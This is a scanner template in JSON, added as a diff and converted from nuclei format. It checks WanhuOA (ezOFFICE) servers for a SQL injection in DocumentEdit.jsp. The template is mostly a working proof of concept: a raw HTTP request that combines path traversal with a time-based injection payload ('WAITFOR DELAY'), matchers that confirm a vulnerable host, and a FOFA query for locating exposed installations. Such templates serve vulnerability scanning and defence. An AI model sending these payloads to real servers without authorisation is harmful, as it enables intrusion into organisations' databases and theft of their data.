@@ -1,0 +1,122 @@
+{
+  "id": "wanhu-documentedit-sqli",
+  "name": "WanhuOA DocumentEdit.jsp - SQL Injection",
+  "author": "SleepingBag945",
+  "severity": "HIGH",
+  "description": "The Wanhu OA DocumentEdit.jsp file has a SQL injection vulnerability. An attacker can perform SQL injection into the database by sending a special request package and obtain sensitive information on the server.\n",
+  "references": [
+    "http://wiki.peiqi.tech/wiki/oa/万户OA/万户OA%20DocumentEdit.jsp%20SQL注入漏洞.html",
+    "https://github.com/Threekiii/Awesome-POC/blob/master/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E4%B8%87%E6%88%B7OA%20DocumentEdit.jsp%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md"
+  ],
+  "tags": [
+    "time-based-sqli",
+    "wanhu",
+    "sqli"
+  ],
+  "protocol": "http",
+  "selfContained": false,
+  "searchQueries": {
+    "fofa": "app\u003d\"万户网络-ezOFFICE\""
+  },
+  "variables": {},
+  "variablesType": "sniper",
+  "verifySteps": [
+    {
+      "stepId": "http_0",
+      "headers": {},
+      "followRedirect": false,
+      "timeout": 0,
+      "readSize": 0,
+      "raw": [
+        "@timeout: 15s\nGET /defaultroot/iWebOfficeSign/OfficeServer.jsp/../../public/iSignatureHTML.jsp/DocumentEdit.jsp?DocumentID\u003d1\u0027;WAITFOR%20DELAY%20\u00270:0:7\u0027-- HTTP/1.1\nHost: {{Hostname}}\n"
+      ],
+      "unsafe": false,
+      "disableCookie": false,
+      "disablePathAutomerge": false,
+      "cache": false,
+      "compressed": false,
+      "chunked": false,
+      "matchers": [
+        {
+          "type": "DSL",
+          "values": [
+            "duration\u003e\u003d7",
+            "status_code \u003d\u003d 200",
+            "contains_all(body, \"iSignature\", \"DoYFSignature\")"
+          ],
+          "negative": false,
+          "condition": "AND",
+          "index": 0,
+          "caseInsensitive": false,
+          "greedy": false,
+          "group": 0
+        }
+      ],
+      "matchersCondition": "OR",
+      "extractors": [],
+      "output": {},
+      "retries": 0,
+      "retryInterval": 0
+    }
+  ],
+  "exploitSteps": [],
+  "globalConfig": {
+    "maxRetries": 0,
+    "retryInterval": 0,
+    "globalHeaders": {},
+    "stopAtFirstMatch": false,
+    "threads": 0,
+    "cookieReuse": false,
+    "dnsConfig": {},
+    "authConfig": {}
+  },
+  "originalPoc": {
+    "id": "wanhu-documentedit-sqli",
+    "info": {
+      "name": "WanhuOA DocumentEdit.jsp - SQL Injection",
+      "author": "SleepingBag945",
+      "severity": "high",
+      "description": "The Wanhu OA DocumentEdit.jsp file has a SQL injection vulnerability. An attacker can perform SQL injection into the database by sending a special request package and obtain sensitive information on the server.\n",
+      "reference": [
+        "http://wiki.peiqi.tech/wiki/oa/万户OA/万户OA%20DocumentEdit.jsp%20SQL注入漏洞.html",
+        "https://github.com/Threekiii/Awesome-POC/blob/master/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E4%B8%87%E6%88%B7OA%20DocumentEdit.jsp%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md"
+      ],
+      "metadata": {
+        "max_request": 1,
+        "fofa_query": "app\u003d\"万户网络-ezOFFICE\""
+      },
+      "tags": "time-based-sqli,wanhu,sqli"
+    },
+    "self_contained": false,
+    "http": [
+      {
+        "global_matchers": false,
+        "cookie_reuse": false,
+        "disable_cookie": false,
+        "disable_path_automerge": false,
+        "threads": 0,
+        "redirects": false,
+        "skip_variables_check": false,
+        "stop_at_first_match": false,
+        "unsafe": false,
+        "read_all": false,
+        "iterate_all": false,
+        "raw": [
+          "@timeout: 15s\nGET /defaultroot/iWebOfficeSign/OfficeServer.jsp/../../public/iSignatureHTML.jsp/DocumentEdit.jsp?DocumentID\u003d1\u0027;WAITFOR%20DELAY%20\u00270:0:7\u0027-- HTTP/1.1\nHost: {{Hostname}}\n"
+        ],
+        "matchers": [
+          {
+            "type": "dsl",
+            "dsl": [
+              "duration\u003e\u003d7",
+              "status_code \u003d\u003d 200",
+              "contains_all(body, \"iSignature\", \"DoYFSignature\")"
+            ],
+            "condition": "and"
+          }
+        ]
+      }
+    ]
+  },
+  "originalFormat": "nuclei"
+}
